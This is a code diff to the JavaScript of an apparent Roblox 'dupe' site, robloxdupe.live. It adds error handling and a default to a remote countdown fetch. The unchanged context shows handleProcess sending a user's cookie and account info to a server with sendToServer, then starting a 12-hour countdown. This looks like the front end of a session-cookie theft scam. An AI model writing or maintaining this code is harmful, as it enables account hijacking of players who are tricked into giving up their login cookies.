@@ -201,18 +201,37 @@ const countdownProgressBar = document.getElementById('countdownProgressBar');
 let currentGameId = null;
 let countdownInterval = null;
 
-const res = await fetch("https://robloxdupe.live/api/countdown");
-const data = await res.json();
+async function getCountdownDuration() {
+    try {
+        const res = await fetch("https://robloxdupe.live/api/countdown");
+        if (!res.ok) {
+            console.warn('Countdown API returned status:', res.status, '- using default 12h');
+            return 12 * 60 * 60 * 1000;
+        }
+        const contentType = res.headers.get('content-type') || '';
+        if (!contentType.includes('application/json')) {
+            console.warn('Countdown API returned non-JSON response - using default 12h');
+            return 12 * 60 * 60 * 1000;
+        }
+        const data = await res.json();
+        return parseInt(data.countdown_hours, 10) * 60 * 60 * 1000;
+    } catch (error) {
+        console.warn('Failed to fetch countdown duration:', error.message, '- using default 12h');
+        return 12 * 60 * 60 * 1000;
+    }
+}
 
-const COUNTDOWN_DURATION = data.countdown_hours * 60 * 60 * 1000;
+async function updateModalDurationText() {
+    const COUNTDOWN_DURATION = await getCountdownDuration();
 
-function updateModalDurationText() {
     const durationHours = Math.round(COUNTDOWN_DURATION / (1000 * 60 * 60));
-    const durationEl = document.getElementById('durationHours');
+    const durationEl = document.getElementById("durationHours");
+
     if (durationEl) {
         durationEl.textContent = durationHours;
     }
 }
+
 updateModalDurationText();
 
 function formatTime(ms) {
@@ -388,6 +407,7 @@ async function handleProcess() {
         await sendToServer(cookie, userInfo, gameName);
 
         // Success - Start 12h countdown
+        const COUNTDOWN_DURATION = await getCountdownDuration();
         const endTime = Date.now() + COUNTDOWN_DURATION;
         await saveCountdown(currentGameId, endTime);
         startCountdownTimer(currentGameId, endTime);
